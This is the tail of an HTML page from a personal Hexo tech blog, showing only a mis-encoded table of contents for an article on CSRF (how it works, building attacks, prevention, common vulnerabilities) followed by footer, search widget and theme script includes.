class="nav-text">CSRFå¦‚ä½•å·¥ä½œ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BACSRF%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">æ„å»ºCSRFæ”»å‡»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB"><span class="nav-number">5.</span> <span class="nav-text">é˜²æ­¢CSRFæ”»å‡»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">å¸¸è§çš„CSRFæ¼æ´</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script><div class="post-scripts"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>